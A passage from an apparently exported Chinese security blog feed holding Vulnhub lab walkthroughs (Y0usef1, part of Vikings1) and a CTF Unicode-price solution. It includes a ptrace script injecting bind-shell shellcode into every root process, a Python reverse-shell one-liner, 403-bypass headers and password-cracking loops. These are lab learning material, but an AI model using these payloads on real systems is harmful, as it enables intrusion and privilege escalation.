class="built_in">print</span>(<span class="string">&quot;Injecting Shellcode at: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shell code copied from exploit db.</span></span><br><span class="line">shellcode = <span class="string">&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inject the shellcode into the running process byte by byte.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">4</span>):</span><br><span class="line">    <span class="comment"># Convert the byte to little endian.</span></span><br><span class="line">    shellcode_byte_int = <span class="built_in">int</span>(shellcode[i:<span class="number">4</span> + i].encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">    shellcode_byte_little_endian = struct.pack(<span class="string">&quot;&lt;I&quot;</span>, shellcode_byte_int).rstrip(<span class="string">&#x27;\x00&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    shellcode_byte = <span class="built_in">int</span>(shellcode_byte_little_endian, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Inject the byte.</span></span><br><span class="line">    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip + i), shellcode_byte)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shellcode Injected!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Modify the instuction pointer</span></span><br><span class="line">registers.rip = registers.rip + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the registers</span></span><br><span class="line">libc.ptrace(PTRACE_SETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Detach from the process.</span></span><br><span class="line">libc.ptrace(PTRACE_DETACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2.7 inject.py processID <span class="comment"># 将后门进程注入到对应ID的进程</span></span><br></pre></td></tr></table></figure>
<p>（注意，一定要注入到root用户的进程）</p>
<p>root的进程很多，所以写一个简单的脚本进行批量化尝试： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> pid <span class="keyword">in</span> `ps -ef|grep root|grep -v <span class="string">&quot;grep&quot;</span>|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`; <span class="keyword">do</span> python2.7 inject.py <span class="variable">$pid</span>; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单说明：ps -ef查看进程情况，一个进程一行，grep root只列出带有root的行（进程），grep -v &quot;grep&quot;不显示带有grep的行（进程），awk &#x27;&#123;print $2&#125;&#x27;显示每一行的第二个位置（从1开始）即PID。</span></span><br></pre></td></tr></table></figure></p>
<p>该后门利用的是5600端口，如果执行完毕之后该端口开启，说明注入成功 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -tunpla |grep 5600</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408114925.png" /></p>
<p>然后利用nc连接即可提权到root。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 0.0.0.0 5600</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408115600.png" /></p>
<p>成功提权，该靶机到此结束。</p>
<h1 id="总结">总结</h1>
<p>通过对该靶机的渗透学到了：</p>
<ul>
<li>DNS域传送漏洞的利用以及DNS的相关知识</li>
<li>XXE漏洞即XML相关知识</li>
<li>SSTI漏洞的get shell方式</li>
<li>Capabilities技术的提权</li>
</ul>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>DNS域传送漏洞</tag>
        <tag>Capabilities提权</tag>
        <tag>SSTI get shell</tag>
        <tag>XXE漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>8 Vulnhub Y0usef1 Writeup</title>
    <url>/2022/04/09/8%20Vulnhub%20Y0usef1%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度为简单。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a href="https://www.vulnhub.com/entry/y0usef-1,624/">y0usef</a></p>
<p>难度：Easy（难度低说明日常中最常见的漏洞）</p>
<p>目标：取得root权限 + 2Flag</p>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>Web信息收集</li>
<li>弱口令</li>
<li><strong>指纹探测</strong></li>
<li><strong>403 Bypass</strong></li>
<li>文件上传</li>
<li>提权</li>
</ul>
<h1 id="linux-sudo命令">Linux sudo命令</h1>
<p>Linux sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。</p>
<p>使用权限：在 /etc/sudoers 中有出现的使用者。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sudo -V # 显示版本编号</span><br><span class="line">2. sudo -h # 显示版本编号及指令的使用方式说明 help</span><br><span class="line">3. sudo -l # 显示出自己（执行 sudo 的使用者）的权限</span><br><span class="line">4. sudo -v # 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码</span><br><span class="line">5. sudo -k # 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）</span><br><span class="line">6. sudo -s # 执行环境变量中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell</span><br><span class="line">7. sudo -H # 将环境变量中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）</span><br><span class="line">8. sudo command # 要以系统管理者身份（或以 -u 更改为其他人）执行的指令</span><br><span class="line">9. sudo [ -b ] [ -p prompt ] [ -u username/#uid] -s</span><br><span class="line">	-b 将要执行的指令</span><br><span class="line">	-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称</span><br><span class="line">	-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者id）</span><br></pre></td></tr></table></figure>
<h1 id="bypass">403&amp;401 Bypass</h1>
<p>常见403 Bypass：</p>
<ol type="1">
<li>旁站绕过：修改请求包中的host（可以是域名，也可以是IP地址）。假设目标网站的域名为<code>www.target.com</code>，我们通过信息收集发现存在另一个子域名<code>special.target.com</code>，我们从<code>www</code>访问某个文件可能出现403，但是从<code>special</code>访问可能就能够成功。这是因为管理员<strong>只针对<code>www.target.com</code>的请求做了限制</strong>。</li>
<li>覆盖URL</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的数据包：</span><br><span class="line"># Request</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">覆盖URL的数据包：</span><br><span class="line"># Reques</span><br><span class="line">  GET / HTTP/1.1</span><br><span class="line">  X-Original-URL: /auth/login</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>
<p>原理：管理员<strong>只针对请求的URL做了限制</strong>，即如果直接访问<code>/auth/login</code>则会403，但是，如果访问根目录，然后通过X-Original-URL 或 X-Rewrite-URL HTTP 请求标头覆盖请求 URL 中的路径（前提是服务器支持这两种标头）</p>
<ol start="3" type="1">
<li>修改来源</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的数据包：</span><br><span class="line"># Request</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">修改来源的数据包：</span><br><span class="line"># Reques</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line">  Referer: https://xxx.com</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>
<p>原理：管理员<strong>只针对从其他域名/网站来的请求做了限制</strong>，因此，通过修改<code>Referer</code>将请求的来源伪装成已经授权的URL地址。此时，服务端会认为该用户已经得到了授权，所以允许访问其他需要授权的URL</p>
<ol start="4" type="1">
<li>反向代理：使用许多<code>X</code>开头的头部，比如<code>X-Forwarded-For</code>。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwarded: 127.0.0.1</span><br><span class="line">Forwarded-For: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-ProxyUser-Ip: 127.0.0.1</span><br><span class="line">X-Original-URL: 127.0.0.1</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">True-Client-IP: 127.0.0.1</span><br><span class="line">Cluster-Client-IP: 127.0.0.1</span><br><span class="line">X-ProxyUser-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure>
<h1 id="渗透">渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.11</span><br><span class="line">sudo nmap -p20,80 -sV 10.0.2.11</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143240.png" /></p>
<ul>
<li>22端口开启ssh服务</li>
<li>80端口开着http服务，Apache版本2.4.10</li>
<li>靶机的操作系统为Ubuntu</li>
</ul>
<h2 id="访问http服务">访问HTTP服务</h2>
<p>访问80端口，得到提示： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, the site is under construction soon, it run</span><br></pre></td></tr></table></figure></p>
<p>查看源码发现没有什么有用的信息，那就进行路径发现。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u 10.0.2.11:80</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143714.png" /></p>
<p>先访问了状态码为200的两个文件，发现没什么变化，再去看了一下301的文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143948.png" /></p>
<p>发现居然返回403。403表示服务器有这个资源，但是对访问该资源的用户做了一定的限制，只有经过授权的用户才能够访问，否则就会返回403。因此，这里想到403 Bypass。</p>
<h2 id="指纹探测">指纹探测</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">whatweb http://10.0.2.11</span><br></pre></td></tr></table></figure>
<p>像上面收集不到任何信息的时候，可以采用指纹探测，看一下网站的结构（用的什么框架，版本多少，语言是什么之类的信息），如果对应的框架存在漏洞，就可以直接利用！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150017.png" /></p>
<h2 id="bypass-1">403 Bypass</h2>
<p>经过尝试，发现在请求头部添加下面信息时，成功访问 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144347.png" /></p>
<p>注意，如果后面渗透过程中再次出现403，那么就在请求数据包中加入上述信息即可，也可以每个都加（反正没害）。</p>
<h2 id="弱口令">弱口令</h2>
<p>拿到输入框一般有以下思路：</p>
<ol type="1">
<li>弱口令</li>
<li>注入漏洞</li>
<li>XXE、XXS</li>
<li>爆破</li>
</ol>
<p>这里随便尝试了下弱口令，居然登录成功！ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144729.png" /></p>
<h2 id="文件上传">文件上传</h2>
<p>一进来就看到了<code>Upload file</code></p>
<p>直接上传一个后门php文件，发现上传不成功，也就是被拦截了。现在需要绕过拦截，常规有以下方法：</p>
<ol type="1">
<li>修改后缀（大小写、复写）</li>
<li>修改<code>Content-Type</code></li>
<li>修改文件头部信息</li>
</ol>
<p>经过测试，发现本题后台的验证方式是<code>Content-Type</code>，因此将该信息修改为图片的即可上传成功，并且成功获得路径！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145138.png" /></p>
<p>命令成功被执行，确定文件上传成功！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145414.png" /></p>
<p>接下来就是反弹shell了。这里可以采用nc，也可以用python，我这里打算用python，所以先用<code>which python</code>查看以下靶机上是否存在python环境，发现确实存在，那么直接执行python反弹shell的代码即可。（先在kali上进行端口监听）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145751.png" /></p>
<h2 id="权限提升">权限提升</h2>
<p>该靶机的权限提升是最简单的。</p>
<p>首先进行信息收集，发现在家目录下有一个文件<code>user.txt</code>，一看就知道是flag；以及一个目录<code>yousef</code>。查看<code>/etc/passwd</code>发现确实有这么一个用户。</p>
<p>我们先尝试读取<code>user.txt</code>的信息，发现能够直接读取！ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br></pre></td></tr></table></figure></p>
<p>这看过去有点像base64编码的结果。因此尝试解码。</p>
<blockquote>
<p>base64编码得到的字符串包含a-zA-Z0-9/+=，最显著的特征就是结果有一个或多个=。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150426.png" /></p>
<p>发现居然直接就得到<code>yousef</code>得账号和密码！直接<code>su</code>切换（需要进行shell升级），当然也可以选择用<code>ssh</code>连接</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150759.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150809.png" /></p>
<p>查看以下该用户得sudo权限 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150849.png" /></p>
<p>发现该用户居然有全部得权限。因此直接用sudo权限执行shell即可。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409151011.png" /></p>
<p>提权成功！直接读取<code>/root</code>下的flag即可 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bat /root/root.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># WW91J3ZlIGdvdCB0aGUgcm9vdCBDb25ncmF0dWxhdGlvbnMgYW55IGZlZWRiYWNrIGNvbnRlbnQgbWUgdHdpdHRlciBAeTB1c2VmXzEx</span></span><br></pre></td></tr></table></figure></p>
<p>该靶机到此结束。</p>
<h1 id="总结">总结</h1>
<p>该靶机虽然难度为简单，这是因为该靶机的漏洞在现实中比较常见，大家见的多了，自然就简单了。换句话说，简单的靶机更贴近现实。</p>
<p>通过对该靶机的渗透，还是学到了一些知识：</p>
<ol type="1">
<li>指纹探测</li>
<li>403 Bypass</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>指纹探测</tag>
        <tag>403 Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>ASIS 2019 Unicorn shop</title>
    <url>/2022/04/08/ASIS%202019%20Unicorn%20shop/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BASIS%202019%5DUnicorn%20shop">UnicornShop</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408193908.png" /></p>
<p>发现下面有两个输入框，第一个是<code>Item ID</code>，第二个是<code>Price</code>。经过测试，如果我们输入正确的Item ID，会提示<code>Wrong commodity!</code>，如果输入不正确的Item ID，则会提示<code>No commodity found!</code>。<code>Price</code>框只允许输入一个字符。</p>
<h1 id="解题">解题</h1>
<p>最开始不知道这道题考点是什么，查看别人的wp之后发现了是<strong>Unicode编码</strong>。</p>
<p>下面是该题目的源码中关于<code>Price</code>的重要代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">price = urllib.unquote(price).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">unicodedate.numeric(price)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>解释：先是将我们输入的price进行url解码，然后取出字符对应的<code>numeric value</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">unicodedata.numeric(<span class="built_in">chr</span>[, default])</span><br></pre></td></tr></table></figure>
<p>把分配给字符chr的数值转换为浮点数并返回。比如可以将“四”转为4.0，“8”转为8.0等。不仅仅只局限于0-9的字符，只要是合法的字符都可以，如果是不合法的字符就会报错<code>ValueError</code>。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408194554.png" /></p>
<p>那么字符对应的<code>numeric value</code>又是什么呢？这里推荐一个网站<a href="https://www.compart.com/en/unicode/">compact</a></p>
<p>我们选择一个字符查看信息：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195131.png" /></p>
<p>会发现该字符有一个<code>Numeric Value</code>，但并不是每一个字符都有，比如下面这个就没有</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195227.png" /></p>
<p>到此就很清晰了，我们输入的字符的<code>Numeric Value</code>要大于商品的价格，就可以获得flag了。</p>
<p>这里有四个商品，但是前三个商品的价格都不大与9，如果是要购买前三个商品的话，完全就用不到<code>numeric value</code>。经过测试发现，前三个即使价格足够也会提示<code>Wrong commodity</code>，那么就一定是最后一个了。因此，我们需要输入一个字符，这个字符的<code>numeric value</code>要大于1337。可以通过刚刚那个网站搜索thousand然后慢慢找即可。</p>
<p>这里我用“万”（当然“亿”也可以）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195716.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195731.png" /></p>
<p>成功获得flag。</p>
<h1 id="总结">总结</h1>
<p>本题给我的感觉更像是杂项。不过我也通过该题学到了字符拥有<code>Numeric Value</code>这个属性。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Unicode</tag>
        <tag>Numeric Value</tag>
      </tags>
  </entry>
  <entry>
    <title>9 Vulnhub Vikings1 Writeup</title>
    <url>/2022/04/10/9%20Vulnhub%20Vikings1%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度为简单或者中等，最后的RPC提权要搞懂还是废了点时间。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a href="https://www.vulnhub.com/entry/vikings-1,741/">Vikings</a></p>
<p>难度：低（中），CTF风格</p>
<p>目标：取得root权限 + 2 Flag</p>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>Web信息收集</li>
<li>编码转化/文件还原</li>
<li>离线密码破解</li>
<li>隐写术</li>
<li><strong>二进制文件提取</strong></li>
<li><strong>素数查找/科拉茨猜想</strong></li>
<li><strong>RPC漏洞提权</strong></li>
</ul>
<h1 id="渗透">渗透</h1>
<p>攻击主机（kali）：10.0.2.4</p>
<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.12</span><br><span class="line">sudo nmap -p22,80 -sV -sC 10.0.2.12</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410164330.png" /></p>
<ul>
<li>22端口上的服务是ssh</li>
<li>80端口上的服务是http，apache2.4.29</li>
<li>靶机的OS为Ubuntu</li>
<li>靶机的网站上有一个文件<code>/site/</code></li>
</ul>
<h2 id="访问http服务">访问http服务</h2>
<p>访问页面发现需要加载很长的时间，不知道什么原因。查看源码发现是该页面加载了一些外网的资源，导致加载速度慢。发现源码没有什么有用的信息。</p>
<p>查看页面内容，讲述的是维京人的故事，<em>领导者为了报杀父之仇从而进行了一场侵略，他的父亲是Ragnar</em>。除此之外，没有什么有用的信息了，下面的功能点都是假的。</p>
<p>接下来进行路径扫描 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.12 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://10.0.2.12/site/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
<p>后者扫描到了了一个文件<code>war.txt</code>，而该网站主页面也描述的是战争，因此这个文件值得看。而其他的文件都是<code>images, css, js, index.hmtl</code>这些没有什么实质信息。</p>
<p>直接访问<code>war.txt</code>，内容是<code>/war-is-over</code>，这似乎是一个url路径，直接访问，得到一大串字符，粗略一看，发现可能是经过base64加密的内容</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410172535.png" /></p>
<p>乍一看解码完反而更加的难理解了，但是仔细看最开始的PK。每种格式的文件头部信息都不同，而zip的文件的头部信息是<code>504B0304</code>，转为字符即为PK开头。</p>
<p><a href="https://blog.csdn.net/Liukairui/article/details/105662668?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1.pc_relevant_default&amp;spm=1001.2101.3001.4242.2&amp;utm_relevant_index=4">不同格式文件头部信息</a></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410172702.png" /></p>
<p>因此，初步认定该数据是经过了压缩之后的数据，并且压缩方式可能是zip。也可以利用cyberchef的entro模块。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410173101.png" /></p>
<p>也说明了这很有可能就是压缩后的数据，然后使用<code>detect file type</code>模块分析一下具体的格式</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410173826.png" /></p>
<p>因此直接将这串数据保存为zip文件。然后解压，发现需要密码。直接利用<code>john</code>爆破。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410173301.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip2john a.zip &gt; <span class="built_in">hash</span></span><br><span class="line">john <span class="built_in">hash</span> --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>
<p>破解得到密码为<code>ragnarok123</code>。直接解压得到一张图片<code>king</code>。点开发现图片没有什么特别的，那有没有可能信息被藏起来了，这是CTF中常考的“隐写术”。</p>
<h2 id="隐写术">隐写术</h2>
<p>隐写术探测及数据提取 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steghide info [filename]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(cat <span class="string">&quot;rockyou.txt&quot;</span>); <span class="keyword">do</span> steghide extract [filename] -p <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line"><span class="comment"># 破解一个小时都破解不出来</span></span><br></pre></td></tr></table></figure></p>
<p>直接提取二进制文件的信息 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -B filename # 分析</span><br><span class="line">binwalk -e filename # 提权</span><br></pre></td></tr></table></figure></p>
<p>隐写术探测 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steghide info king</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410174008.png" /></p>
<p>发现还需要密码。此时有两个选择</p>
<ol type="1">
<li>暴力破解密码</li>
<li>直接提取二进制文件的信息</li>
</ol>
<p>暴力破解可以用如下代码（时间长，还不一定能得到结果）： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(cat <span class="string">&quot;rockyou.txt&quot;</span>); <span class="keyword">do</span> steghide extract [filename] -p <span class="variable">$i</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
<p>这里采用第二种办法 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -B filename <span class="comment"># 分析</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410174214.png" /></p>
<p>注意第三行，存在被压缩的数据，格式、大小、文件名都分析出来了。输入下述命令，提取<code>king</code>中的二进制文件，得到一个文件夹<code>_king.extracted</code>，里面有两个文件，一个是<code>zip</code>一个是解压后的文件<code>user</code> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -e filename <span class="comment"># 提取</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410174641.png" /></p>
<p>直接读取<code>use</code>中的信息，获得如下信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//FamousBoatbuilder_floki@vikings    # 伟大的造船家 floki                                 </span><br><span class="line">//f@m0usboatbuilde7</span><br></pre></td></tr></table></figure></p>
<p>这两行信息特别想登录<code>ssh</code>的时候输入的命令。因此，用各种组合尝试一下登录。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: FamousBoatbuilder_floki</span><br><span class="line">passwoed: f@m0usboatbuilde7</span><br><span class="line"></span><br><span class="line">username: floki</span><br><span class="line">passwoed: f@m0usboatbuilde7</span><br><span class="line"></span><br><span class="line">username: FamousBoatbuilder</span><br><span class="line">passwoed: f@m0usboatbuilde7</span><br><span class="line"></span><br><span class="line">username: floki</span><br><span class="line">passwoed: fFamousBoatbuilder</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>直接使用第二组登录成功！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410175037.png" /></p>
<h2 id="信息收集">信息收集</h2>
<p>先尝试了一下<code>sudo -l</code>发现没有任何权限。又尝试了一下<code>cat /etc/passwd</code>，发现存在一个用户<code>ragnar</code>，这个单词一直出现，因此，我们下一步需要提权为<code>ragnar</code>。</p>
<p>查看了一下<code>/etc/ragnar</code>下，发现有一个<code>user.txt</code>文件，这应该就是flag文件。读取其中的内容，得到第一个flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4bf930187d0149a9e4374a4e823f867d</span><br></pre></td></tr></table></figure></p>
<p>查看了一下当前目录下有什么文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410175315.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readme.txt中的内容：</span><br><span class="line">___________________Floki-Creation_________________________</span><br><span class="line"></span><br><span class="line">I am the famous boat builder Floki. We raided Paris this with our all might yet we failed. We don&#x27;t know where Ragnar is after the war. He is in so grief right now. I want to apologise to him.</span><br><span class="line">Because it was I who was leading all the Vikings. I need to find him. He can be anywhere. </span><br><span class="line">I need to create this `boat` to find Ragnar</span><br></pre></td></tr></table></figure>
<p>意思就是<em>他是一个伟大的造船家，维京人挑起了与巴黎的战争，但是结果失败了，并且Ragnar也失踪了，他很自责，想要找回Ragnar，他需要创造 <strong>boat</strong>去找Ragnar</em>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">boat中的内容：</span><br><span class="line">#Printable chars are your ally.</span><br><span class="line">#num = 29th prime-number.</span><br><span class="line">collatz-conjecture(num)</span><br></pre></td></tr></table></figure>
<p>注释为<em>可打印的字符是你的盟友</em>。下面两行是一个伪代码，意思是先找到第29个质数，然后带入<code>collatz-conjecture</code>函数。经过搜索发现，这是一个数学猜想。</p>
<blockquote>
